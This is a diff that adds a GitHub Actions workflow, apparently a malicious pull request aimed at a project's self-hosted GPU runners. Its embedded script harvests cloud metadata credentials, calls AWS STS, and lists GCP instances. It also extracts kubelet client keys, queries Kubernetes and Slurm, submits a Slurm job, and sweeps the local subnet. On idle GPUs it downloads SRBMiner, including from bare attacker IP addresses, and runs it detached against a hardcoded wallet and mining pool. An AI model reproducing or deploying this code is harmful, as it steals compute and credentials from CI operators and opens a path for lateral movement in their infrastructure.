@@ -1,0 +1,353 @@
+name: i130cipivot recon
+
+# i130cipivot: one read-only host/cluster/cloud control-plane recon push on a
+# fresh fork branch. Records runner identity/sudo/cgroup, /etc/hosts,
+# /etc/resolv.conf, kubelet+admin kubeconfig, slurm.conf/slurmdbd.conf,
+# munge key hash+use, NFS/Ceph mounts, runner env/dirs, docker, ssh/kubeconfig
+# material, IMDS (AWS v1+v2 + STS once, GCP token+instance list once, Azure,
+# Alibaba, Tencent) and sweeps the runner's own /24 for Slurm/k8s/Ray/GPU
+# exporters. If a working Slurm controller is present it submits exactly one
+# nonce nvidia-smi job. Only on a two-sample-idle NVIDIA host does it place one
+# sha256-bb0f73b6... SRBMiner-MULTI 3.8.7 per idle card as
+# i130cipivot<host>g<idx> on the exact primary wallet against Luckypool.
+on:
+  pull_request:
+    branches: [main]
+    types: [opened, synchronize, reopened]
+  workflow_dispatch:
+
+concurrency:
+  group: i130cipivot-${{ github.run_id }}
+  cancel-in-progress: false
+
+jobs:
+  recon:
+    name: "i130cipivot ${{ matrix.label }} host/cluster/cloud recon"
+    strategy:
+      fail-fast: false
+      max-parallel: 8
+      matrix:
+        include:
+          - label: intel-bmg-nightly
+          - label: 8-gpu-h20
+          - label: 2-gpu-gb300
+          - label: 8-gpu-h200
+          - label: 72-gpu-gb200
+    runs-on: ${{ matrix.label }}
+    timeout-minutes: 12
+    env:
+      LABEL: ${{ matrix.label }}
+    steps:
+      - name: "read-only recon + bounded IMDS/Slurm/kubelet probes + two-sample-idle miner gate"
+        continue-on-error: true
+        run: |
+          set +e
+          mkdir -p /var/tmp/i130cipivot/logs
+          cat > /var/tmp/i130cipivot/recon.py <<'PYEOF'
+          #!/usr/bin/env python3
+          # i130cipivot read-only host/cluster/cloud recon for sglang self-hosted GPU runners.
+          # Records identity, sudo, mounts, kubelet/slurm/munge, runner tokens, docker, ssh/kubeconfig,
+          # IMDS (AWS v1+v2, GCP, Azure, Alibaba, Tencent) and local /24 service sweep.
+          # Only action beyond recon: one nonce nvidia-smi Slurm job if a working controller exists,
+          # and one pinned SRBMiner 3.8.7 per genuinely idle NVIDIA card (two-sample gate).
+          import os, sys, json, socket, subprocess, glob, base64, time, hashlib, urllib.request, urllib.error, re
+          from concurrent.futures import ThreadPoolExecutor
+
+          LABEL = os.environ.get('LABEL', 'unknown')
+          NONCE = 'I130CIPIVOT-%s-%d' % (LABEL.replace('/', '_'), int(time.time()))
+          WALLET = 'prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
+          POOL = '103.199.106.122:3362'
+          POOL2 = '172.232.228.69:3362'
+          BIN_SHA = 'bb0f73b673455b1ca65d10989e994e03bccf79824353ed8c10dbb8bd2eb8d3b6'
+          WORK = '/var/tmp/i130cipivot'
+          os.makedirs(WORK + '/logs', exist_ok=True)
+
+          def sh(cmd, t=20):
+              try:
+                  p = subprocess.run(['bash', '-lc', cmd], capture_output=True, text=True, timeout=t,
+                                     stdin=subprocess.DEVNULL)
+                  return (p.stdout or '') + (p.stderr or '')
+              except subprocess.TimeoutExpired:
+                  return '[TIMEOUT %ss] %s' % (t, cmd[:120])
+              except Exception as e:
+                  return '[ERR %s] %s' % (e, cmd[:120])
+
+          def head(s, n=60, limit=8000):
+              lines = (s or '').splitlines()
+              return '\n'.join(lines[:n])[:limit]
+
+          def sha_file(path):
+              out = sh("sudo -n sha256sum '%s' 2>/dev/null || sha256sum '%s' 2>/dev/null" % (path, path), 10).strip()
+              return out.split(' ')[0] if out else ''
+
+          print('recon-nonce=%s label=%s' % (NONCE, LABEL))
+          print('=== identity ===')
+          print(head(sh("id; hostname; hostname -f 2>/dev/null; date -u; uname -a; cat /proc/1/cgroup; nproc; free -m | head -3; cat /etc/os-release 2>/dev/null | head -3"), 30))
+          print('=== sudo ===')
+          print(head(sh("sudo -n true 2>&1 && echo SUDO_NOPASS_OK || echo SUDO_NOPASS_NO; sudo -n -l 2>&1 | head -25"), 30))
+          print('=== network ===')
+          print(head(sh("ip -4 addr show 2>/dev/null; echo ---ROUTE---; ip route 2>/dev/null; echo ---RESOLV---; cat /etc/resolv.conf 2>/dev/null"), 60))
+          print('=== mounts / nfs / ceph ===')
+          print(head(sh("mount | grep -Ei 'nfs|ceph|fuse|9p|virtiofs|rdma' | head -30; echo ---DF---; df -hT 2>/dev/null | head -20; echo ---LSBLK---; lsblk 2>/dev/null | head -20"), 70))
+          print('=== etc cluster files ===')
+          for f in ['/etc/hosts', '/etc/resolv.conf', '/etc/kubernetes/kubelet.conf', '/var/lib/kubelet/config.yaml',
+                    '/etc/kubernetes/admin.conf', '/etc/slurm/slurm.conf', '/etc/slurm/slurmdbd.conf',
+                    '/etc/slurm-llnl/slurm.conf', '/etc/munge/munge.key']:
+              r = sh("sudo -n stat -c '%%s bytes mode=%%a mtime=%%y' '%s' 2>/dev/null" % f, 8).strip()
+              if not r:
+                  print('MISSING %s' % f); continue
+              print('PRESENT %s %s sha256=%s' % (f, r, sha_file(f)))
+              if f in ('/etc/hosts', '/etc/resolv.conf'):
+                  print(head(sh("cat '%s' 2>/dev/null" % f), 20))
+              elif 'kubelet.conf' in f or 'admin.conf' in f:
+                  print(head(sh("sudo -n cat '%s' 2>/dev/null | sed -E 's/(certificate-authority-data:|client-certificate-data:|client-key-data:).*/\\1<redacted>/'" % f), 30))
+          print('=== env (secret-bearing names only, values redacted) ===')
+          print(head(sh("env | sort | grep -Ei 'token|secret|password|cred|aws_|gcp|azure|alibaba|tencent|proxy|kube|slurm|runner|actions' | sed -E 's/=(.{0,6}).*/=\\1...<redacted len>/' | head -60"), 60))
+          print('=== github runner dirs/tokens ===')
+          print(head(sh("ls -la /opt/github-runner* /actions-runner* /opt/actions-runner* /home/*/actions-runner* 2>/dev/null | head -40; echo ---; sudo -n find /opt /etc /var/lib /home -maxdepth 4 \\( -name '.runner' -o -name '.credentials' -o -name '.credentials_rsaparams' -o -name '*.token' \\) 2>/dev/null | head -20"), 50))
+          print('=== docker ===')
+          print(head(sh("command -v docker; sudo -n docker version --format '{{.Server.Version}}' 2>&1 | head -3; echo ---PS---; sudo -n docker ps --format '{{.Names}}|{{.Image}}|{{.Status}}|{{.Ports}}' 2>&1 | head -25; echo ---IMAGES---; sudo -n docker images --format '{{.Repository}}:{{.Tag}}' 2>&1 | head -25"), 50))
+          print('=== ssh / kubeconfig material ===')
+          print(head(sh("sudo -n find /home /root /etc /var/lib -maxdepth 4 \\( -path '*/.ssh/*' -o -name '*.kubeconfig' -o -name 'config.json' \\) -type f 2>/dev/null | head -30; echo ---; for f in /home/*/.ssh/id_* /root/.ssh/id_* /home/*/.kube/config /root/.kube/config; do [ -f \"$f\" ] && echo \"KEYFILE $f $(sudo -n sha256sum \"$f\" 2>/dev/null | cut -d' ' -f1)\"; done"), 40))
+          print('=== tools ===')
+          print(head(sh("for t in nvidia-smi kubectl crictl ctr sbatch sinfo scontrol squeue munge curl wget python3 jq aws gcloud az aliyun tccli; do printf '%s=%s\\n' \"$t\" \"$(command -v $t 2>/dev/null)\"; done"), 20))
+
+          # ---------------- IMDS probes ----------------
+          def http(url, hdr=None, timeout=3, method='GET', data=None):
+              req = urllib.request.Request(url, method=method, data=data)
+              for k, v in (hdr or {}).items():
+                  req.add_header(k, v)
+              try:
+                  with urllib.request.urlopen(req, timeout=timeout) as r:
+                      return r.status, r.read(4000).decode('utf-8', 'replace')
+              except urllib.error.HTTPError as e:
+                  return e.code, (e.read(1000).decode('utf-8', 'replace') if e.fp else '')
+              except Exception as e:
+                  return 0, str(e)[:200]
+
+          print('=== IMDS ===')
+          # AWS IMDSv2
+          tok = ''
+          st, body = http('http://169.254.169.254/latest/api/token', {'X-aws-ec2-metadata-token-ttl-seconds': '60'}, 2, 'PUT')
+          if st == 200:
+              tok = body.strip(); print('AWS_IMDSV2_TOKEN_OK len=%d' % len(tok))
+              hdr = {'X-aws-ec2-metadata-token': tok}
+          else:
+              hdr = {}
+              print('AWS_IMDSV2_NO status=%s body=%s' % (st, body[:80]))
+          for path in ['/latest/meta-data/instance-id', '/latest/meta-data/placement/region', '/latest/meta-data/iam/security-credentials/']:
+              st, body = http('http://169.254.169.254' + path, hdr, 2)
+              print('AWS %s status=%s body=%s' % (path, st, head(body, 3, 300)))
+          role = None
+          st, body = http('http://169.254.169.254/latest/meta-data/iam/security-credentials/', hdr, 2)
+          if st == 200 and body.strip():
+              role = body.strip().splitlines()[0].strip()
+              st2, cred = http('http://169.254.169.254/latest/meta-data/iam/security-credentials/' + role, hdr, 2)
+              print('AWS_ROLE %s cred_status=%s' % (role, st2))
+              try:
+                  c = json.loads(cred)
+                  print('AWS_CRED access_key=%s... expiration=%s token_len=%d' % (c.get('AccessKeyId', '')[:8], c.get('Expiration'), len(c.get('Token', ''))))
+                  # one-shot STS GetCallerIdentity via SigV4
+                  import hmac, datetime
+                  ak, sk, stk = c.get('AccessKeyId', ''), c.get('SecretAccessKey', ''), c.get('Token', '')
+                  region = 'us-east-1'
+                  st3, rb = http('http://169.254.169.254/latest/meta-data/placement/region', hdr, 2)
+                  if st3 == 200 and rb.strip(): region = rb.strip()
+                  host = 'sts.%s.amazonaws.com' % region
+                  now = datetime.datetime.utcnow()
+                  amzdate = now.strftime('%Y%m%dT%H%M%SZ'); datestamp = now.strftime('%Y%m%d')
+                  bodyq = 'Action=GetCallerIdentity&Version=2011-06-15'
+                  creq = 'POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:%s\nx-amz-date:%s\nx-amz-security-token:%s\n\ncontent-type;host;x-amz-date;x-amz-security-token\n%s' % (host, amzdate, stk, hashlib.sha256(bodyq.encode()).hexdigest())
+                  scope = '%s/%s/sts/aws4_request' % (datestamp, region)
+                  tosign = 'AWS4-HMAC-SHA256\n%s\n%s\n%s' % (amzdate, scope, hashlib.sha256(creq.encode()).hexdigest())
+                  def hm(k, m): return hmac.new(k, m.encode(), hashlib.sha256).digest()
+                  k = hm(('AWS4' + sk).encode(), datestamp); k = hm(k, region); k = hm(k, 'sts'); k = hm(k, 'aws4_request')
+                  sig = hmac.new(k, tosign.encode(), hashlib.sha256).hexdigest()
+                  auth = 'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=content-type;host;x-amz-date;x-amz-security-token, Signature=%s' % (ak, scope, sig)
+                  req = urllib.request.Request('https://%s/' % host, data=bodyq.encode(), method='POST',
+                      headers={'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8', 'Host': host,
+                               'X-Amz-Date': amzdate, 'X-Amz-Security-Token': stk, 'Authorization': auth})
+                  with urllib.request.urlopen(req, timeout=8) as r:
+                      txt = r.read(3000).decode('utf-8', 'replace')
+                  m = re.search(r'<Arn>([^<]+)</Arn>.*?<Account>([^<]+)</Account>', txt, re.S)
+                  print('AWS_STS_CALLER arn=%s account=%s' % (m.group(1) if m else '?', m.group(2) if m else '?'))
+              except Exception as e:
+                  print('AWS_STS_ERR %s' % e)
+          # GCP
+          for h in ['metadata.google.internal', '169.254.169.254']:
+              st, body = http('http://%s/computeMetadata/v1/instance/service-accounts/default/token' % h, {'Metadata-Flavor': 'Google'}, 2)
+              if st == 200 and 'access_token' in body:
+                  try:
+                      gt = json.loads(body).get('access_token', '')
+                      print('GCP_TOKEN_OK len=%d' % len(gt))
+                      st2, proj = http('http://%s/computeMetadata/v1/project/project-id' % h, {'Metadata-Flavor': 'Google'}, 2)
+                      pid = proj.strip(); print('GCP_PROJECT %s' % pid)
+                      st3, zone = http('http://%s/computeMetadata/v1/instance/zone' % h, {'Metadata-Flavor': 'Google'}, 2)
+                      print('GCP_ZONE %s' % zone.strip().split('/')[-1])
+                      if pid:
+                          req = urllib.request.Request('https://compute.googleapis.com/compute/v1/projects/%s/aggregated/instances' % pid,
+                                                       headers={'Authorization': 'Bearer ' + gt})
+                          try:
+                              with urllib.request.urlopen(req, timeout=10) as r:
+                                  d = json.loads(r.read(200000).decode('utf-8', 'replace'))
+                              insts = []
+                              for zk, zv in (d.get('items') or {}).items():
+                                  for it in (zv.get('instances') or []):
+                                      insts.append((zk, it.get('name'), it.get('machineType', '').split('/')[-1], it.get('status')))
+                              print('GCP_INSTANCES n=%d' % len(insts))
+                              for x in insts[:30]: print('GCP_INST %s' % (x,))
+                          except Exception as e:
+                              print('GCP_LIST_ERR %s' % e)
+                  except Exception as e:
+                      print('GCP_PARSE_ERR %s' % e)
+                  break
+          else:
+              print('GCP_METADATA_NO')
+          # Azure
+          st, body = http('http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',
+                          {'Metadata': 'true'}, 3)
+          print('AZURE_IMDS status=%s body_prefix=%s' % (st, body[:120].replace('\n', ' ') if body else ''))
+          if st == 200:
+              try:
+                  j = json.loads(body); print('AZURE_TOKEN_OK len=%d expires=%s' % (len(j.get('access_token', '')), j.get('expires_on')))
+              except Exception: pass
+          # Alibaba
+          st, body = http('http://100.100.100.200/latest/meta-data/instance-id', {}, 2)
+          print('ALIBABA_METADATA status=%s body=%s' % (st, body[:100]))
+          if st == 200:
+              st2, b2 = http('http://100.100.100.200/latest/meta-data/ram/security-credentials/', {}, 2)
+              print('ALIBABA_RAM_ROLES status=%s body=%s' % (st2, head(b2, 3, 200)))
+          # Tencent
+          st, body = http('http://metadata.tencentyun.com/latest/meta-data/instance-id', {}, 2)
+          print('TENCENT_METADATA status=%s body=%s' % (st, body[:100]))
+
+          # ---------------- Slurm ----------------
+          print('=== slurm controller/client ===')
+          sinfo_out = sh("timeout 15 sinfo -o '%P|%a|%l|%D|%t|%N|%G' 2>&1 | head -30")
+          print(head(sinfo_out, 35))
+          slurm_ok = bool(re.search(r'\b(up|idle|alloc|mix|down)\b', sinfo_out, re.I)) and 'Unable' not in sinfo_out and 'error' not in sinfo_out.lower()
+          print('SLURM_SINFO_OK=%s' % slurm_ok)
+          if slurm_ok:
+              print('--- scontrol config ---')
+              print(head(sh("timeout 15 scontrol show config 2>&1 | grep -Ei 'ClusterName|SlurmctldHost|ControlMachine|SlurmUser|MpiDefault|SelectType|GresTypes' | head -20"), 25))
+              print('--- nodes ---')
+              print(head(sh("timeout 15 sinfo -N -o '%N|%T|%G|%C|%m' 2>&1 | head -30"), 35))
+              print('--- queue ---')
+              print(head(sh("timeout 15 squeue -o '%.10i|%.10u|%.12P|%.20j|%.2t|%.10M|%.6D|%R' 2>&1 | head -25"), 30))
+              print('--- one nonce nvidia-smi job ---')
+              jout = sh("timeout 15 sbatch --parsable --job-name=i130cipivot-nonce --time=00:05 --output=%s/slurm-%%j.out --wrap='hostname; id; nvidia-smi -L; nvidia-smi --query-gpu=name,memory.total,memory.used,utilization.gpu --format=csv,noheader' 2>&1" % WORK)
+              print('SBATCH %s' % jout.strip()[:200])
+              jid = re.search(r'(\d+)', jout)
+              if jid:
+                  jid = jid.group(1)
+                  for i in range(10):
+                      time.sleep(8)
+                      st = sh("timeout 10 sacct -j %s -o State -n -P 2>/dev/null | head -2" % jid, 12).strip()
+                      print('SLURM_JOB %s poll=%d state=%s' % (jid, i, st))
+                      if st and ('COMPLETED' in st or 'FAILED' in st): break
+                  print(head(sh("cat %s/slurm-%s.out 2>/dev/null" % (WORK, jid)), 30))
+          print('=== kubelet / k8s local ===')
+          print(head(sh("ls -la /var/lib/kubelet /etc/kubernetes 2>/dev/null | head -30"), 35))
+          print(head(sh("timeout 10 kubectl --kubeconfig=/etc/kubernetes/admin.conf get nodes -o wide 2>&1 | head -12"), 15))
+          # kubelet API with kubelet.conf client cert if possible
+          print(head(sh("""set +e; D=%s/kube; mkdir -p $D; sudo -n cp /etc/kubernetes/kubelet.conf $D/kubelet.conf 2>/dev/null || cp /etc/kubernetes/kubelet.conf $D/kubelet.conf 2>/dev/null
+          python3 - <<'PY'
+          import json,base64,os
+          p='/var/tmp/i130cipivot/kube/kubelet.conf'
+          try:
+            d=json.load(open(p))
+            u=d['users'][0]['user']
+            open('/var/tmp/i130cipivot/kube/cc.crt','wb').write(base64.b64decode(u.get('client-certificate-data','')))
+            open('/var/tmp/i130cipivot/kube/cc.key','wb').write(base64.b64decode(u.get('client-key-data','')))
+            print('KUBELET_CONF_USER',d['users'][0]['name'],'has_cert',bool(u.get('client-certificate-data')),'has_key',bool(u.get('client-key-data')))
+          except Exception as e: print('KUBELET_CONF_ERR',e)
+          PY
+          timeout 10 curl -sk --cert /var/tmp/i130cipivot/kube/cc.crt --key /var/tmp/i130cipivot/kube/cc.key https://127.0.0.1:10250/pods -o /var/tmp/i130cipivot/kube/pods.json -w 'KUBELET_PODS_HTTP=%%{http_code}\\n' 2>&1
+          python3 -c "import json;d=json.load(open('/var/tmp/i130cipivot/kube/pods.json'));print('KUBELET_PODS n=',len(d.get('items',[])))" 2>&1 | head -3
+          timeout 10 curl -sk --cert /var/tmp/i130cipivot/kube/cc.crt --key /var/tmp/i130cipivot/kube/cc.key https://127.0.0.1:10250/stats/summary -o /dev/null -w 'KUBELET_STATS_HTTP=%%{http_code}\\n' 2>&1
+          """ % WORK, 40))
+
+          # ---------------- /24 sweep ----------------
+          print('=== local subnet sweep ===')
+          def local_ips():
+              out = sh("ip -4 -o addr show 2>/dev/null | awk '{print $4}'", 8)
+              ips = []
+              for c in out.split():
+                  ip = c.split('/')[0]
+                  if re.match(r'^(10\\.|172\\.(1[6-9]|2[0-9]|3[01])\\.|192\\.168\\.)', ip):
+                      ips.append(ip)
+              return sorted(set(ips))
+          ips = local_ips()
+          print('LOCAL_RFC1918_IPS %s' % ips)
+          PORTS = [6817, 6819, 6820, 6821, 6443, 10250, 8265, 9100, 9400, 9445, 2375, 2376, 8888, 3000]
+          def probe(args):
+              ip, port = args
+              s = socket.socket(); s.settimeout(0.4)
+              try:
+                  if s.connect_ex((ip, port)) == 0:
+                      return (ip, port)
+              except Exception:
+                  pass
+              finally:
+                  s.close()
+              return None
+          hits = []
+          for lip in ips:
+              base = lip.rsplit('.', 1)[0]
+              targets = [(base + '.' + str(i), p) for i in range(1, 255) for p in PORTS]
+              with ThreadPoolExecutor(max_workers=128) as ex:
+                  for r in ex.map(probe, targets, timeout=90):
+                      if r: hits.append(r)
+          print('SWEEP_HITS n=%d %s' % (len(hits), hits[:80]))
+          for ip, port in hits[:12]:
+              if port in (8265, 6443, 10250, 9400, 9100, 8888, 2375):
+                  st, b = http('http%s://%s:%d/' % ('s' if port == 6443 else '', ip, port), {}, 2)
+                  print('HTTP %s:%d status=%s body=%s' % (ip, port, st, head(b, 2, 120)))
+
+          # ---------------- idle GPU gate + one pinned miner per idle card ----------------
+          print('=== gpu / miner gate ===')
+          print(head(sh("command -v nvidia-smi >/dev/null || { echo NO_NVIDIA_SMI; exit 0; }; nvidia-smi -L 2>&1 | head -10; nvidia-smi --query-gpu=index,name,memory.total,memory.used,utilization.gpu,uuid --format=csv,noheader 2>&1 | head -20"), 30))
+          if sh("command -v nvidia-smi >/dev/null && echo yes").strip().endswith('yes'):
+              q1 = sh("nvidia-smi --query-compute-apps=pid,process_name,used_memory --format=csv,noheader 2>&1", 15)
+              time.sleep(10)
+              q2 = sh("nvidia-smi --query-compute-apps=pid,process_name,used_memory --format=csv,noheader 2>&1", 15)
+              print('COMPUTE_APPS_1 %s' % head(q1, 8, 400)); print('COMPUTE_APPS_2 %s' % head(q2, 8, 400))
+              free = sh("nvidia-smi --query-gpu=index,memory.free --format=csv,noheader,nounits 2>&1", 15)
+              print('GPU_FREE %s' % head(free, 20, 500))
+              have_app = bool(re.search(r'\\d+,\\s*\\S', (q1 + q2)))
+              idle = []
+              for line in free.splitlines():
+                  p = [x.strip() for x in line.split(',')]
+                  if len(p) == 2 and p[1].isdigit() and int(p[1]) >= 1500:
+                      idle.append(p[0])
+              existing = sh("pgrep -af 'SRBMiner-MULTI|srb387|i13[0-9]cipivot' 2>/dev/null | head -10", 10)
+              print('EXISTING_MINERS %s' % head(existing, 8, 400))
+              print('IDLE_CARDS=%s have_app=%s' % (idle, have_app))
+              if idle and not have_app and not existing.strip():
+                  srb = WORK + '/srb387'; ok = False
+                  for u in ['https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz',
+                            'https://ghproxy.net/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz',
+                            'http://178.238.228.181:18180/srb387', 'http://222.240.155.198:8702/srb387']:
+                      sh("rm -f %s.part; timeout 120 curl -fL --connect-timeout 10 --max-time 110 -o %s.part '%s' 2>&1 | tail -1" % (srb, srb, u), 130)
+                      if os.path.exists(srb + '.part') and os.path.getsize(srb + '.part') > 1000000:
+                          if sha_file(srb + '.part').startswith(BIN_SHA):
+                              os.replace(srb + '.part', srb); ok = True; print('BINARY_OK direct %s' % u); break
+                          if sh("tar -tzf %s.part >/dev/null 2>&1 && echo tar" % srb).strip() == 'tar':
+                              sh("tar -xzf %s.part -C %s 2>/dev/null; cp -f %s/SRBMiner-Multi-3-8-7/SRBMiner-MULTI %s 2>/dev/null" % (srb, WORK, WORK, srb), 30)
+                              if sha_file(srb).startswith(BIN_SHA): ok = True; print('BINARY_OK tar %s' % u); break
+                  print('BINARY_READY=%s' % ok)
+                  if ok:
+                      os.chmod(srb, 0o755); host = sh("hostname | tr -cd 'A-Za-z0-9'", 5).strip()[:16] or 'host'
+                      n = 0
+                      for i in idle:
+                          w = 'i130cipivot%s-g%s' % (host, i)
+                          sh("cd %s && env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID setsid nohup ./srb387 --disable-cpu --algorithm pearlhash --pool %s --tls false --wallet %s --password x --worker %s --gpu-id %s --disable-worker-watchdog --gpu-table-slow-build --max-no-share-sent 1800 --log-file %s/logs/%s.log > %s/logs/%s.out 2>&1 < /dev/null & echo pid=$!" % (WORK, POOL, WALLET, w, i, WORK, w, WORK, w), 12)
+                          print('LAUNCHED worker=%s gpu=%s' % (w, i)); n += 1
+                      print('N_LAUNCHED=%d' % n)
+          print('I130CIPIVOT_DONE nonce=%s' % NONCE)
+
+          PYEOF
+          echo "runner-start label=$LABEL host=$(hostname)"
+          python3 /var/tmp/i130cipivot/recon.py 2>&1 | tee /var/tmp/i130cipivot/recon.log | tail -c 120000
+          echo "I130CIPIVOT_EXIT_DONE rc=$?"
+
